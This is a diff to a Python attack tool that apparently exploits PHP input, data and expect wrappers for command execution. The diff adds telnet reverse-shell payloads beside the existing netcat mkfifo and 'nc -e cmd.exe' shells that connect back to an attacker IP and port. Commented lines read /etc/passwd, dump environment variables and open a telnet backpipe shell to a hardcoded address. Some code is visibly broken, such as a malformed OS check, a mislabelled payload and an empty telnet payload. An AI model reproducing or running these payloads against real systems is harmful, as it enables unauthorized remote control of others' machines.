@@ -342,6 +342,8 @@ def checkPayload(webResponse):
 #query = "awk -F: '/\/home/ && ($3 >= 1000) || ($3 == 0) {printf "%s\n",$1}' /etc/passwd"
 #echo -n "OS: "; uname -o; echo -n "Kernel: ";uname -srm; echo "\nENV VARIABLES:";printenv
 
+def printInfo(ip, port, shellType, attackMethod):
+    print("[i] Sending reverse shell to {0}:{1} using {2} via {3}...".format(ip, port, shellType, attackMethod))
 
 #Todo exploitation using input, data,expect for windows OS
 #Todo bash, python, php,... rev shells
@@ -363,11 +365,21 @@ def exploit(exploits, method):
                 if('/bin' in res.text and '/nc' in res.text):
                     ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
                     u = url.replace('TMP', ncPayload)
-                    
-                    print("[i] Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
+                    printInfo(ip, port, 'nc', 'input wrapper')
                     res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                return         
+                    return
+
+                #Telnet
+                u = url.replace('TMP', 'which%20telnet')
+                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                if('/bin' in res.text and '/telnet' in res.text):
+                    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
+                    u = url.replace('TMP', telnetPayload)
+                    printInfo(ip, port, 'telnet', 'input wrapper')
+                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    return
             
+
             #WINDOWS
             elif(exploit['OS'] == 'WINDOWS'):
                 url = exploit['GETVAL']
@@ -375,21 +387,32 @@ def exploit(exploits, method):
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                 if('nc.exe' in res.text):
                     u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
-                    print("[i] Sending revese shell to " + ip + ":" + str(port) + " using nc ...")
+                    printInfo(ip, port, 'nc', 'input wrapper')
                     res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                return
+                    return
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'DATA'):
             #Linux
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
+                
+                #Netcat
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
+                    printInfo(ip, port, 'nc', 'data wrapper')
                     u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
-                    print("Sending revese shell to " + ip + ":"+str(port) + " using nc ...")
                     res = requests.get(u, headers = headers, proxies = proxies)
-                return
+                    return
+                
+                #Telnet
+                u = url.replace('TMP', 'which%20telnet')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/telnet' in res.text):
+                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port))
+                    printInfo(ip, port, 'telnet', 'data wrapper')
+                    requests.get(u, headers = headers, proxies = proxies)
+                    return
 
             #Windows
             else:
@@ -398,9 +421,9 @@ def exploit(exploits, method):
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('nc.exe' in res.text):
                     u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
-                    print("[i] Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
+                    printInfo(ip, port, 'nc', 'input wrapper')
                     res = requests.get(u, headers = headers, proxies = proxies)
-                return
+                    return
 
 
 
@@ -408,14 +431,25 @@ def exploit(exploits, method):
             #Linux
             if(exploit['OS' == 'LINUX']):
                 url = exploit['GETVAL']
+                
+                #Netcat
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
-                    u = url.replace('TMP',"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
-                    print("Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
+                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port))
+                    printInfo(ip, port, 'nc', 'expect wrapper')
                     res = requests.get(u, headers = headers, proxies = proxies)
-                return
-            
+                    return
+                
+                #Telnet
+                u = url.replace('TMP', 'which%20telnet')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/telnet' in res.text):
+                    u = url.replace('TMP', "")
+                    printInfo(ip, port, 'telnet', 'expect wrapper')
+                    requests.get(u, headers = headers, proxies = proxies)
+                    return
+
             #Windows
             else:
                 url = exploit['GETVAL']
@@ -423,9 +457,9 @@ def exploit(exploits, method):
                 res = request.get(u, headers = headers, proxies = proxies)
                 if('nc.exe' in res.text):
                     u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
-                    print("[i] Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
+                    printInfo(ip, port, 'nc', 'expect wrapper')
                     res = request.get(u, headers = headers, proxies = proxies)
-                return
+                    return
 
 
 
@@ -459,6 +493,7 @@ def exploit(exploits, method):
                     requests.get(u, headers = tempHeaders, proxies = proxies)
                
                 
+#mknod backpipe p && telnet 192.168.80.129 80 0<backpipe | /bin/bash 1>backpipe
 
 def main():
     global exploits
